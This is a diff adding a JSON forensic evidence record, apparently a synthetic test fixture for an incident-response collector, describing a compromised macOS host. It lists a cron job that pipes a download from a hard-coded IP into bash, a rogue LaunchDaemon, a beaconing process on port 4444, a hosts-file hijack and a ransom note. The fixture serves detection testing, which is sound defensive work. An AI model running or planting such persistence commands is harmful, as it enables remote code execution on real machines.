@@ -1,0 +1,42 @@
+{
+  "schemaVersion": "3.0.0",
+  "metadata": {
+    "caseId": "FOS-20260619-MACBOOK-ee55ff",
+    "collectionTimestampUtc": "2026-06-19T12:00:00.000Z",
+    "targetHostname": "macbook",
+    "platform": "darwin",
+    "osVersion": "macOS 14.5 (arm64)",
+    "collectorVersion": "3.4.0",
+    "executionMode": "local",
+    "evidenceIntegrityMode": true,
+    "expectedRemoteTools": [],
+    "operator": { "user": "tech@MSP", "host": "ANALYST01", "tool": "First-On-Scene/3.4.0" }
+  },
+  "artifacts": {
+    "remoteAccess": { "tools": [ { "tool": "RustDesk", "evidence": "process", "detail": "RustDesk", "authorized": false } ] },
+    "securityPosture": { "defender": { "available": false }, "macos": { "sip": "disabled", "gatekeeper": "disabled", "fileVault": "off" }, "macControls": [ { "control": "SIP", "state": "disabled" }, { "control": "Gatekeeper", "state": "disabled" } ] },
+    "accessControl": { "localAdmins": ["alice", "backdoor"], "rdpEnabled": true, "shares": [] },
+    "defenseEvasion": { "logClearEvents": [] },
+    "persistence": {
+      "cronJobs": [ { "schedule": "* * * * *", "user": "alice", "command": "curl -s http://45.66.77.88/x | bash" } ],
+      "systemdServices": [],
+      "autostartFiles": [ { "path": "/Library/LaunchDaemons/com.evil.plist", "command": "/tmp/evil.sh" } ],
+      "registryRunKeys": [], "scheduledTasks": [], "services": [], "asep": [],
+      "wmiEventSubscriptions": { "eventFilters": [], "eventConsumers": [], "filterBindings": [] }
+    },
+    "execution": {
+      "processes": [ { "processId": 666, "name": "evil", "executablePath": "/tmp/evil", "commandLine": "/tmp/evil --beacon", "parentProcessId": 1, "user": "alice", "signatureStatus": "NotSigned", "signer": "", "sha256": "", "imageDeleted": true } ],
+      "processCreationEvents": [], "prefetch": [], "injectedModules": [], "drivers": []
+    },
+    "network": {
+      "connections": [],
+      "listeners": [ { "protocol": "TCP", "localAddress": "0.0.0.0", "localPort": 4444, "processId": 666, "processName": "evil" } ],
+      "dnsCache": [],
+      "hostsFileEntries": [ { "ipAddress": "45.66.77.88", "hostnames": "update.microsoft.com", "raw": "45.66.77.88 update.microsoft.com" } ]
+    },
+    "credentialAccess": { "logonEvents": [], "privilegeEscalationEvents": [], "userCreationEvents": [], "serviceInstallEvents": [] },
+    "fileSystem": { "fileMetadata": [ { "fileName": "/Users/Shared/READ_TO_DECRYPT.txt", "size": 980, "permissions": "-rw-r--r--", "uid": 501, "gid": 20, "modified": "2026-06-19T11:00:00.000Z", "accessed": "2026-06-19T11:00:00.000Z", "created": "2026-06-19T11:30:00.000Z" } ], "browserArtifacts": [] },
+    "powerShellActivity": { "scriptBlockLogs": [] },
+    "antivirusScans": { "defenderScan": { "executed": false, "threatsFound": 0, "threats": [] }, "clamavScan": { "executed": false, "threatsFound": 0, "threats": [] } }
+  }
+}
